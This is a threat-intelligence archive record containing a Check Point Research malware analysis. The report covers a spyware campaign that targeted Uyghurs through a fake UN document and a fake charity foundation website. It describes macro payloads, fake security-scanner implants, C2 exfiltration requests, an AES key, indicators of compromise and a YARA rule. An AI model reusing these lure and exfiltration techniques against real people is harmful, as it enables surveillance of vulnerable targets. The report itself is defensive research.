{
    "id": "163c984e-39f6-4e2e-ba4d-d5bea833f794",
    "created_at": "2023-01-12T15:04:53.184493Z",
    "updated_at": "2025-03-27T02:09:29.812507Z",
    "deleted_at": null,
    "sha1_hash": "12f9ddfa9a0755a1075821d1c611f6c3027dd8b2",
    "title": "2021-05-27 - Uyghurs, a Turkic ethnic minority in China, targeted via fake foundations - Check Point Research",
    "authors": "",
    "file_creation_date": "2022-05-28T18:11:41Z",
    "file_modification_date": "2022-05-28T18:11:41Z",
    "file_size": 3257370,
    "plain_text": "# Uyghurs, a Turkic ethnic minority in China, targeted via fake foundations\n\n**[research.checkpoint.com/2021/uyghurs-a-turkic-ethnic-minority-in-china-targeted-via-fake-foundations/](https://research.checkpoint.com/2021/uyghurs-a-turkic-ethnic-minority-in-china-targeted-via-fake-foundations/)**\n\nMay 27, 2021\n\nMay 27, 2021\n\n## Introduction\n\nDuring the past year, Check Point Research (CPR), in cooperation with Kaspersky’s GReAT,\nhave been tracking an ongoing attack targeting a small group of Uyghur individuals located\nin Xinjiang and Pakistan. Considerable effort was put into disguising the payloads, whether\nby creating delivery documents that appear to be originating from the United Nations using\nup to date related themes, or by setting up websites for non-existing organizations claiming\nto fund charity groups.\n\nIn this report, we examine the flow of both infection vectors and provide our analysis of the\nmalicious artifacts we came across during this investigation, even though we were unable to\nobtain the later stages of the infection chain.\n\n## Delivery Document\n\nOur investigation began with a malicious document named `UgyhurApplicationList.docx`\n(MD5: `a1d773621581981a94459bbea454cdf8 ), which carried the logo of the United`\nNations Human Rights Council (UNHRC), and contained decoy content from a United\n\n\n-----\n\nNations general assembly discussing human rights violations.\n\n**Fig. 1 Delivery document carrying the UNHCR logo**\n\nAfter clicking on “Enable Editing”, a malicious external template is downloaded from\n```\nofficemodel[.]org . This template has embedded VBA macro code, which then checks\n\n```\nthe operating system’s architecture, and based on this proceeds to decode a 32-bit or a 64bit payload.\n\n**Fig. 2 Malicious macros checking the operating system version**\n\nThe payloads are embedded in the document itself and are base64 encoded. After the\ncorresponding version is decoded, it is then named `OfficeUpdate.exe and saved under`\nthe `%TEMP% directory. In the two` `OfficeUpdate.exe samples we located, the payload`\n\n\n-----\n\nwas a shellcode loader which starts with basic evasion and anti-debugging techniques, by\nusing functions such as sleep and `QueryPerformanceCounter .`\nThe shellcode in both variants attempts to fetch a remote payload. In the first variant, we\nfound the loaded shellcode attempted to connect to `185.94.189[.]207, where the second`\nvariant tried to connect to `officemodel[.]org, even though it crashes during execution.`\nUnfortunately, we were not able to retrieve the next stage payload for analysis.\n\n## Delivery Websites\n\nThe domain observed in the malicious document ( officemodel[.]org ) resolved to the\nsame IP address as `unohcr[.]org – a domain impersonating the Office of the United`\nNations High Commissioner for Human Rights (OHCHR). This overlap in resolution\nhappened over a long period of time, from April to December 2020.\n\nBy pivoting on that infrastructure we were able to reveal another infection vector that was\nused in this operation: distribution through fake websites that host malicious executables\ntargeting Windows users.\n\n**Fig. 3 Connection to additional domains**\n\nAnother IP address that `unohcr[.]org resolved to revealed a domain named`\n```\ntcahf[.]org, which hosted a website claiming to represent TCAHF – the “Turkic Culture\n\n```\nand Heritage Foundation”.\n\nTCAHF is supposedly a private organization that funds and supports groups working for\n“Tukric culture and human rights”, when in truth it is a made up entity, and most of its\nwebsite’s content is copied from the legitimate `opensocietyfoundations.org .`\n\n\n-----\n\n**Fig. 4 Fake website (top) compared to the legitimate one**\n\nThe malicious functionality of the TCAHF website is well disguised and only appears when\nthe victim attempts to apply for a grant (see the added “Application” menu button in Fig. 4\nabove). The website then claims it must make sure the operating system is safe before\nentering sensitive information for the transaction, and therefore asks the victims to download\na program to scan their environments. The website offers two download options, one for\nMacOS and one for Windows, but only Windows programs were available when we analyzed\nthe website, and the MacOS version link served an empty file.\n\n\n-----\n\n**Fig. 5 Links to download a fake security scanner**\n\n## Malware implants\n\nDuring 2020, the fake TCAHF website served at least two variants of the Windows implants:\none we refer to as `WebAssistant which was available in May 2020, and another called`\n```\nTcahfUpdate which was available in October 2020.\n\n### Fake Website Infection Chain\n\n```\nThe first payload we observed being downloaded from `tcahf[.]org was called` `win.exe .`\nThis payload is an Installshield package that executes a Windows Installer (MSI) file that\ninstalls the `WebAssistant application and drops four files.`\n\n\n-----\n\n**Fig. 6 Execution flow of the WebAssistant application**\n\nThe installer also registers a URL protocol handler for the `sechk scheme: whenever a user`\nis redirected to a URL which starts with `sechk:// (instead of` `https:// for example),`\n```\nWebAssistant.exe will be executed.\n\n```\n**Fig. 7 Registry value to handle “sechk” scheme under HKCR**\n\n\n-----\n\nThis scheme appears in the source of the TCAHF website, and when the victim accesses\ndifferent pages, a pop-up message asking to run the `WebAssistant application is shown:`\n\n**Fig. 8 A pop up to run WebAssistant due to the presence of “sechk” scheme**\n\n### WebAssistant analysis\n\nUnlike most malicious samples, `WebAssistant does not attempt to conceal itself or hide its`\nexecution from the victim, as it is allegedly a security scanner that is required for the\napplication process in the website to work. The `WebAssistant installer creates four files,`\nthree of which were compiled by the attackers on May 21st, 2020. The files are saved under\nthe `C:\\Program Files\\WebAssistant\\SecurityScan directory:`\n\n**File Name** **MD5** **Description**\n\nWebAssistant.exe 2f7492423586a3061e5641b5b271ca54 .NET binary\n\nWindowsService.exe 98cf461bcf9e3cef2869e2ea3d7f3341 .NET binary\n\nWinInterface.dll 65532ef9879d6b86a865d3e2b0621354 C++ library\n\nNewtonsoft.Json.dll 6815034209687816d8cf401877ec8133 Legitimate library used to\nparse JSON objects\n\n\n-----\n\nThe main executable ( WebAssistant.exe ) has a graphical interface that is shown as a\ndecoy to the victims, potentially allowing them to conduct the fake scan:\n\n**Fig. 9 WebAssistant’s user interface**\n\nWhen the victim presses the `Scan button, the` `ThreadScanSystem method in the .NET`\nbinary is called. Unlike what its name suggests, this method does not really scan the system\nfor security issues, but instead displays hardcoded strings informing the victim that\neverything is in order while it performs other actions in the background:\n\n**Fig. 10 Messages shown to the victim during the fake scan**\n\nFirst, `ThreadScanSystem calls the` `CheckUpdate method and sends a` `GET request to`\nthe C2 server along with the following parameters\n```\naction=update&app=WebAssistant/1.0&db=Database/1.0, and the server returns a\n\n```\nJSON object:\n\n\n-----\n\n**Fig. 11 Communicating with the C2 server to check for pending updates**\n\nThe JSON object is then parsed for certain fields such as `appurl or` `dburl . The` `appurl`\nfield contains a URL to download another executable called `Setup.exe, which is then`\nsaved to the `TEMP directory. After downloading` `Setup.exe,` `WebAssistant runs it and`\ndisplays its graphical component to the victim.\n\n**Fig. 12 Downloading and running Setup.exe**\n\nOn the other hand, the `dburl field in the JSON object contains a URL to download a library`\ncalled `WinDBProject.dll . This library exports three functions that are loaded by the`\n```\nWebAssistant binary: getWinDBVersion, winDBCheckVmProcess, and\nwinDBCheckConflicts .\n\n```\n**Fig. 13 Importing functions from the downloaded DLL**\n\nBy default, those three functions are loaded from the WinInterface.dll library created by the\ninstaller, however each exported function in `WinInterface.dll is simply a wrapper`\ndesigned to execute a function with the same name in `WinDBProject.dll . This means`\nthat without the additional downloaded DLL, the functions in `WinDBProject.dll do not`\ncontain any logic of their own and we cannot see the full implementation. Unfortunately, we\nwere unable to obtain both `WinDBProject.dll and` `Setup.exe .`\n\n\n-----\n\n**Fig. 14 Wrapper functions in WinInterface.dll**\n\nFollowing this, `WebAssistant.exe proceeds to collect the following information about the`\ninfected system: the BIOS serial number, CPU information, and MAC address. It also collects\na list of the running processes and a list of the installed programs.\nIt is interesting to note that when the `WebAssistant application enumerates the running\nprocesses, it calls the winDBCheckVmProcess function imported from the downloaded DLL.\nThe name of this function suggests that its purpose is to check if the result contains any\nprocesses associated with virtual machines, which might mean the malware is running in an\nemulated environment or by a researcher. In an attempt to evade detection, the attackers\nthen stop the execution after displaying a message that the program cannot run inside a\nvirtual machine.\n\n**Fig. 15 Checking if the application is running inside a virtual machine**\n\nSimilarly, the list of installed programs is examined by the imported `winDBCheckConflicts`\nfunction to check for the existence of certain software on the system, and stop the execution\nif it is found. Although we do not know which programs are sought by\n```\nwinDBCheckConflicts, it is possible the attackers use it to evade AntiVirus solutions and\n\n```\nsecurity products that might otherwise detect the presence of their malicious activity.\nIf no problematic process or software is encountered, the collected information (system\ninformation list, processes list, installed programs list) is then uploaded to the C2 server.\nEach one of the lists is encoded using base64, and added to a JSON object that is sent to\n```\ntcahf[.]org/verify_.php?flag=false via a POST request.\n\n```\n\n-----\n\nPOST hxxps://tcahf[.]org/verify_/.php?flag=false HTTP/1.1\n\nUser-Agent: WebAssistant/1.0\n\nHost: tcahf[.]org\n\nContent-Length: 28397\n\n{“Process”: [REDACTED], “Soft”: [REDACTED], “Uid”: [REDACTED]}\n\n**Fig. 16 Uploading the collected data to the C2 server**\n\nAlternatively, if the `WebAssistant application is executed as a result of the registered URL`\nscheme `sechk, the execution flow is quite similar to the one we already described. The`\nmain function checks if a `load argument was provided ( sechk://load ), and if so calls`\ntwo methods: `initApp and` `globalScan . The` `globalScan method exfiltrates the same`\nsystem information seen above, whereas the `initApp schedules a` `Timer to collect and`\nupload this data every half an hour.\n\n**Fig. 17 Timed event to exfiltrate system information**\n\nLastly, another binary dropped by this installer is `WindowsService.exe, which is a service`\nthat ensures the persistence of the malicious functionality and performs the same actions as\n```\nWebAssistant.exe periodically.\n\n### TcahfUpdate Analysis\nTcahfUpdate replaced the previous WebAssistant implant and was available for\n\n```\ndownload from the fake website during October 2020. `TcahfUpdate is composed of three`\nfiles: two are .NET executables created by the attackers and compiled in September 2020,\nwhile the third is a legitimate DLL library.\n\n**Name** **MD5** **Description**\n\nRegisterUi.exe 1b5dbd351bb7159eb08868c46a3fe3a6 .NET binary\n\nTcahfUpdateSvr.exe 90fcbd5c904326466c3b6af1ca34aae1 .NET binary\n\n\n-----\n\nNewtonsoft.Json.dll 6815034209687816d8cf401877ec8133 Legitimate library used to\nparse JSON objects\n\nregistration code to be used in the TCAHF website. Behind the scenes however, it behaves\nin a similar manner to the previously described `WebAssistant variant.` `RegisterUI.exe`\nis the user interface of the `TcahfUpdate application, when the UI is loaded it triggers the`\ncollection of system information in the background, with some changes introduced from the\nolder version.\n\n**Fig. 18 User interface of RegisterUi.exe**\n\nFor example, in addition to the BIOS serial number, CPU information, and MAC address, this\nvariant also adds the local system time to the stolen data. The data is then encrypted using\nAES with the encryption key `A4DC55FAC1E4E512C07C1504FDC9B668, and is uploaded to`\nthe C2 server by appending it to the following URL:\n```\nhxxps://www.tcahf[.]org/verify_.php?uuid= . The encrypted data is also used to\n\n```\ngenerate the registration code displayed to the victim in the UI.\n\n**Fig. 19 Encrypting the stolen data using the “uuidEncode” method**\n\nAs for the second executable, `TcahfUpdateSvr.exe is a windows service that makes sure`\nthe malicious code is constantly running. It assigns `RegisterUI.exe to be the handler of`\nthe `tcahf:// protocol, so that it could be executed whenever the victim accesses a URL`\nthat begins with this scheme\n\n\n-----\n\nMoreover, it can fetch an additional payload by communicating with the C2 server using the\n```\nhxxps://www.tcahf[.]org/cgi-bin/update.py?uuid=[DATA] URL along the user agent\nCertificate Update(For Windows)/1.0 . As with the previous variant, the result from\n\n```\nthis request is a JSON object that may contain the `Setup.exe executable. The executable`\nis saved under the `%TEMP% directory and executed with admin privileges:`\n\n**Fig. 20 Downloading and running Setup.exe**\n\n## Victims\n\nDue to the nature of the malicious websites and the decoy content used in the delivery\ndocument, we can assess this campaign is intended to target the Uyghur minority or\norganizations supporting them. Our telemetry supported this assessment, as we have\nidentified only a handful of victims in Pakistan and China. In both cases, the victims were\nlocated in regions mostly populated by the Uyghur minority.\n\n## Attribution\n\nAlthough we were unable to find code or infrastructure similarities to a known threat group,\nwe attribute this activity, with low to medium confidence, to a Chinese-speaking threat actor.\nWhen examining the malicious macros in the delivery document, we noticed that some\n[excerpts of the code were identical to VBA code that appeared in multiple Chinese forums,](https://www.office-cn.net/access-function/338.mhtml)\nand might have been copied from there directly.\n\n\n-----\n\n**Fig. 21 Similar macro code in Chinese forum**\n\n## Recent Updates\n\nWhile most of the activity described above happened during 2020, it appears the threat actor\nbehind this campaign is still active in 2021, with two newly registered domains:\n```\nmalaysiatcahf[.]org and icislieri[.]com . These two domains resolved to the same\n\n```\nIP address as `officemodel[.]org, and the server responded only to the unique URLs we`\nhave previously observed in this campaign, further confirming the connection to this threat\nactor.\n\nThe second domain ( icislieri[.]com ) appears to be impersonating the Turkish Ministry\nof the Interior, but currently both domains redirect to the website of a Malaysian government\nbody called the “Terengganu Islamic Foundation”. This suggests that the attackers are\npursuing additional targets in countries such as Malaysia and Turkey, although they might\nstill be developing those resources as we have not yet seen any malicious artifacts\nassociated with those domains.\n\n## Conclusion\n\nOur joint analysis of this previously unreported threat group, which first emerged in early\n2020, shows an elaborate attack that has been taking advantage of different infection vectors\nto target supporters and members of the Uyghur minority.\n\n\n-----\n\nThe malicious executables created by the attackers exfiltrate basic information about the\ninfected system, but can also download a second-stage payload, or in the case of the\ndocuments, fetch additional commands from the C2 server. This means that we have not yet\nseen all the capabilities of this malware, or the full course of action taken by the attackers\nfollowing a successful infection.\n\nLastly, the fact that the attackers are still registering domains indicates this activity is still\nongoing, and there might be new sightings or new variants of the malware in the near future.\n\n## Indicators of Compromise\n\n**Malicious documents**\n```\n0f104af8eb3ab1a192d9d8793c405483\na1d773621581981a94459bbea454cdf8\nc5d5f37a0a599ee790172630a2501f96\n\n```\n**Malicious embedded PE**\n```\nb343e06f20f178117be130f082e23eab\nb808ab4dfc1c52e5be07e6815cf09d40\nedcefd70f93bf00849e336ea13a258f7\n\n```\n**Fake applications**\n```\nf538754efdc17e9ba88aeb1ff31ecdcb\n2f7492423586a3061e5641b5b271ca54\n98cf461bcf9e3cef2869e2ea3d7f3341\n65532ef9879d6b86a865d3e2b0621354\n90fcbd5c904326466c3b6af1ca34aae1\n1b5dbd351bb7159eb08868c46a3fe3a6\n\n```\n**Domains and IPs**\n```\ntcahf[.]org\nunohcr[.]org\nmalaysiatcahf[.]org\nofficemodel[.]org\nicislieri[.]com\n185.198.166[.]58\n45.134.1[.]3\n47.91.170[.]222\n46.8.180[.]147\n\n## Appendix B: Yara Rules\n\n```\n\n-----\n\n```\nrule apt_WebAssistant_TcahfUpdate {\nmeta:\n  description = \"Rule for detecting the fake WebAssistant and TcahfUpdate\napplications used to target the Uyghur minority\"\n  version = \"1.0\"\n  last_modified = \"2021-05-06\"\n  hash = \"2f7492423586a3061e5641b5b271ca54\"\n  hash = \"1b5dbd351bb7159eb08868c46a3fe3a6\"\n  hash = \"90fcbd5c904326466c3b6af1ca34aae1\"\nstrings:\n  $url = {2f 00 63 00 67 00 69 00 2d 00 62 00 69 00 6e 00 2f [0-50] 2e 00 70 00 79\n00 3f 00}\n  $lib = \"Newtonsoft.Json\"\n  $mac = \"MACAddress Is Not NULL\" wide\ncondition:\n  uint16(0)==0x5A4D and $url and $lib and $mac\n  and filesize < 1MB\n}\n\n## Appendix C: MITRE ATT&CK\n\n```\n**Tactic** **Technique** **Technique Name**\n\n\nResource Development T1583.001\nT1587.001\n\n\nAcquire Infrastructure: Domains\nDevelop Capabilities: Malware\n\n\nInitial Access T1566.001 Phishing: Spearphishing Attachment\n\n\nExecution T1204.002\nT1569.002\n\n\nUser Execution: Malicious File\nSystem Services: Service Execution\n\n\nPersistence T1053 Scheduled Task/Job\n\nDefense Evasion T1140 Deobfuscate/Decode Files or Information\n\n\nDiscovery T1082\nT1518\n\nT1057\n\nCommand and Control T1071.001\nT1573.001\n\n\nSystem Information Discovery\nSoftware Discovery\n\nProcess Discovery\n\nApplication Layer Protocol: Web Protocols\nEncrypted Channel: Symmetric Cryptography\n\n\nExfiltration T1041 Exfiltration Over C2 Channel\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-27 - Uyghurs, a Turkic ethnic minority in China, targeted via fake foundations - Check Point Research.pdf"
    ],
    "report_names": [
        "2021-05-27 - Uyghurs, a Turkic ethnic minority in China, targeted via fake foundations - Check Point Research.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535893,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653761501,
    "ts_modification_date": 1653761501,
    "files": {
        "pdf": "https://archive.orkl.eu/12f9ddfa9a0755a1075821d1c611f6c3027dd8b2.pdf",
        "text": "https://archive.orkl.eu/12f9ddfa9a0755a1075821d1c611f6c3027dd8b2.txt",
        "img": "https://archive.orkl.eu/12f9ddfa9a0755a1075821d1c611f6c3027dd8b2.jpg"
    }
}